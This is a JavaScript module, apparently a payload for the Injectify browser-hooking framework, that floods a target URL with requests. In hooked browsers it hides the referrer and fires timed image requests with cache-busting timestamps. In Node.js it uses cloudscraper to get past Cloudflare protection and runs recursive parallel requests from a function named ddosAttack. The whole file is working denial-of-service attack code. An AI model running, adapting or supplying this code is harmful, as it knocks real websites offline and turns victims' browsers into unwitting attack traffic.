var interval = 10
var url = module.params
var query = true

/**
 * Parse the parameters
 */
if (typeof module.params == 'object') {
    if (module.params.interval) interval = module.params.interval
    if (module.params.url) url = module.params.url
    if (module.params.query) query = module.params.query
}

if (injectify.info.platform === 'browser') {
    /**
     * Prevent referrer from being sent in the requests
     */
    var meta = document.createElement('meta')
    meta.name = 'referrer'
    meta.content = 'no-referrer'
    document.head.appendChild(meta)

    if (url) {
        /**
         * Request the target url
         */
        setInterval(function() {
            var request = new Image()
            var target = url
            // Add a query parameter to the URL of the current posix
            if (query) target += '?' + +new Date
            request.src = target
            request.onload
        }, interval)
        module.return(true)
    } else {
        module.return(false)
    }
} else {
    /**
     * NodeJS enabled client
     */
    var cloudscraper = require('cloudscraper'); // leave the ;
    (function ddosAttack(thread) {
        var requestUrl = url
        if (query) requestUrl += '?' + +new Date
        cloudscraper.get(requestUrl, function(error, response, body) {
            /**
             * Move out of callstack
             */
            if (thread == 1) {
                setTimeout(function() {
                    ddosAttack(1)
                }, 0)
            }
        })
        if (thread == 1) {
            cloudscraper.get(requestUrl, function() {
                ddosAttack(2)
            })
            cloudscraper.get(requestUrl, function() {
                ddosAttack(3)
            })
            cloudscraper.get(requestUrl, function() {
                ddosAttack(4)
            })
            cloudscraper.get(requestUrl, function() {
                ddosAttack(5)
            })
        }
    })(1)
}